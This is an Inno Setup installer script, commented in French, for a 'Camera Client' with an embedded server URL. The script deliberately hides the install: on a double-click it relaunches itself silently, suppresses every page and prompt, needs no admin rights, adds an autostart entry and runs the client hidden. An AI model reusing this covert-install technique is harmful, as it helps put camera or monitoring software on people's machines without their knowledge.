; Installateur Windows du client caméra — 100 % silencieux, sans saisie.
; Nécessite Inno Setup (gratuit) : https://jrsoftware.org/isinfo.php
; Compilation : ISCC packaging\windows\installer.iss
; (le script build_windows.bat le fait automatiquement s'il trouve ISCC)
;
; Le résultat, CameraClient-Setup.exe, ne nécessite PAS Python sur la
; machine de l'utilisateur : dist\CameraClient.exe (fabriqué par
; PyInstaller) embarque déjà tout l'interpréteur ET l'URL du serveur
; (voir embedded_config.py, généré par build_windows.bat).
;
; Comportement : un simple double-clic sur CameraClient-Setup.exe
;   - n'affiche AUCUNE fenêtre (il se relance lui-même en mode très silencieux) ;
;   - installe le client dans le profil de l'utilisateur (pas d'admin requis) ;
;   - active le démarrage automatique avec Windows ;
;   - lance le client immédiatement, en arrière-plan, sans fenêtre.
; Les options /VERYSILENT, /SUPPRESSMSGBOX, /NORESTART restent acceptées
; (déploiement par script, GPO...), mais ne sont plus nécessaires.
;
; IMPORTANT : ce script vit dans packaging\windows\, PAS dans build\windows\.
; build\ est l'espace de travail de PyInstaller (il est nettoyé/recréé à
; chaque build avec --clean) : tout fichier qui y vivrait serait supprimé.

#define MyAppName "Camera Client"
; Version bumpée à 1.0.1 pour vérifier facilement qu'on teste bien le
; nouveau build : clic droit sur CameraClient-Setup.exe > Propriétés >
; Détails > "Version du produit" doit afficher 1.0.1. Si ça affiche
; encore 1.0, c'est l'ancien exe (avec DisableReadyPage=no) qui est testé.
#define MyAppVersion "1.0.1"
#define MyAppExeName "CameraClient.exe"

[Setup]
; AppId unique : ne changez jamais cette ligne, sinon les mises à jour
; s'installeront côte à côte au lieu de remplacer l'ancienne version.
; GUID valide généré une fois pour toutes (Tools > Generate GUID dans Inno Setup) —
; ne JAMAIS le régénérer pour ce projet.
AppId={{3F8A1C2D-6B4E-4A9F-8D3C-1A2B3C4D5E6F}
AppName={#MyAppName}
AppVersion={#MyAppVersion}
AppPublisher=Selon Randriavao
DefaultDirName={autopf}\{#MyAppName}
; Pas de page de choix du dossier, pas de page de bienvenue, pas de page
; « prêt à installer » : l'utilisateur ne doit RIEN voir ni choisir.
DisableProgramGroupPage=yes
DisableWelcomePage=yes
DisableDirPage=yes
DisableReadyPage=yes
DisableFinishedPage=yes
; Supprime aussi la boîte « Ceci va installer [...] sur cet ordinateur.
; Continuer ? » qui s'affiche normalement avant même la page de bienvenue.
DisableStartupPrompt=yes
; Installation dans le profil utilisateur, sans UAC (pas d'admin requis).
PrivilegesRequired=lowest
; PAS de SetupMutex : il provoquerait un deadlock entre le processus parent
; (qui attend la fin de l'enfant avec ewWaitUntilTerminated) et le processus
; enfant (qui attend que le parent libère le mutex). Sans SetupMutex, la
; relance fonctionne immédiatement. Les doubles-clics simultanés restent
; gérés par Inno Setup (il détecte le second lancement et affiche une erreur
; claire, ce qui est rare et acceptable).
ArchitecturesInstallIn64BitMode=x64compatible
OutputDir=..\..\releases
OutputBaseFilename=CameraClient-Setup
Compression=lzma
SolidCompression=yes
UninstallDisplayIcon={app}\{#MyAppExeName}
UninstallDisplayName={#MyAppName}
; Évite toute tentative de dialogue de langue au démarrage.
UsePreviousLanguage=no
; Évite le dialogue « Voulez-vous vraiment annuler ? » en mode silencieux.
AllowNoIcons=yes

[Languages]
Name: "english"; MessagesFile: "compiler:Default.isl"

[Files]
Source: "..\..\dist\{#MyAppExeName}"; DestDir: "{app}"; Flags: ignoreversion

[Icons]
; Démarrage automatique avec la session Windows (toujours activé).
Name: "{userstartup}\{#MyAppName}"; Filename: "{app}\{#MyAppExeName}"

[Run]
; Lancement immédiat, en arrière-plan, y compris en mode silencieux
; (pas de « skipifsilent », sinon le client ne démarrerait qu'à la prochaine session).
Filename: "{app}\{#MyAppExeName}"; Flags: nowait runhidden

[UninstallRun]
Filename: "{sys}\taskkill.exe"; Parameters: "/F /IM {#MyAppExeName}"; Flags: runhidden; RunOnceId: "StopCameraClient"

[UninstallDelete]
Type: filesandordirs; Name: "{localappdata}\CameraClient"

[Code]
{ ---------------------------------------------------------------------------
  Relance automatique en mode silencieux au double-clic.

  Objectif STRICT : double-clic = EXACTEMENT le comportement de
    CameraClient-Setup.exe /VERYSILENT /SUPPRESSMSGBOX /NORESTART /LOG="..."
  c'est-à-dire : aucune interface, installation complète, log écrit.

  Méthode fiable :
   1. Si l'utilisateur a déjà passé /VERYSILENT ou /SILENT → on ne fait rien,
      l'installateur continue normalement (mode silencieux déjà demandé).
   2. Sinon (double-clic) → on relance CE MÊME exécutable avec les arguments
      silencieux + un /LOG systématique, en ATTENDANT la fin, puis on quitte.

  Pourquoi Exec + ewWaitUntilTerminated (et PAS ShellExec ni ewNoWait) :
   - ewNoWait : le parent meurt avant que l'enfant ait fini son init → Windows
     peut avorter le lancement → rien ne se passe (bug initial).
   - ShellExec + SW_HIDE : fragile quand l'exe se relance lui-même (conflit
     de handle, SmartScreen) → échec silencieux → rien ne s'installe.
   - Exec + ewWaitUntilTerminated : le parent RESTE VIVANT pendant toute
     l'installation de l'enfant, puis quitte. C'est la méthode éprouvée.

  Pourquoi PAS de SetupMutex :
   - Avec SetupMutex, le parent détient le mutex pendant qu'il attend
     l'enfant (ewWaitUntilTerminated), et l'enfant BLOQUE sur le mutex
     → deadlock → Inno Setup timeout → interface affichée (bug constaté).
   - Sans SetupMutex, la relance fonctionne immédiatement.

  Fallback :
   - Si la relance échoue (Exec retourne False, antivirus...), on NE quitte
     PAS silencieusement : on laisse l'installateur continuer normalement
     (il affichera ses pages). Mieux vaut une interface que rien du tout.
  --------------------------------------------------------------------------- }
function InitializeSetup(): Boolean;
var
  ResultCode: Integer;
  Params: String;
  LogPath: String;
begin
  Result := True;

  { Mode silencieux déjà demandé (script, GPO, ligne de commande) :
    on ne relance pas, on laisse l'installateur continuer. }
  if WizardSilent then
  begin
    Result := True;
    Exit;
  end;

  { Double-clic : on prépare les arguments EXACTS du mode silencieux. }
  Params := '/VERYSILENT /SUPPRESSMSGBOX /NORESTART';

  { /LOG systématique : écrit dans %TEMP%, sans aucune fenêtre. }
  LogPath := ExpandConstant('{tmp}') + '\CameraClient-Setup.log';
  { On supprime l'ancien log pour ne pas mélanger deux exécutions. }
  if FileExists(LogPath) then
    DeleteFile(LogPath);
  Params := Params + ' /LOG="' + LogPath + '"';

  { Relance de CE MÊME exécutable, en attendant la fin. }
  if not Exec(ExpandConstant('{srcexe}'), Params, '',
              SW_HIDE, ewWaitUntilTerminated, ResultCode) then
  begin
    { La relance a échoué : on continue normalement plutôt que de quitter
      sans rien faire. L'utilisateur verra au moins l'interface. }
    Result := True;
    Exit;
  end;

  { L'enfant a terminé son installation : on quitte sans rien afficher. }
  Result := False;
end;

{ Mise à jour : arrête l'ancienne instance du client pour pouvoir remplacer
  le .exe pendant l'installation. }
function PrepareToInstall(var NeedsRestart: Boolean): String;
var
  ResultCode: Integer;
begin
  Exec(ExpandConstant('{sys}\taskkill.exe'), '/F /IM {#MyAppExeName}', '',
       SW_HIDE, ewWaitUntilTerminated, ResultCode);
  Result := '';
end;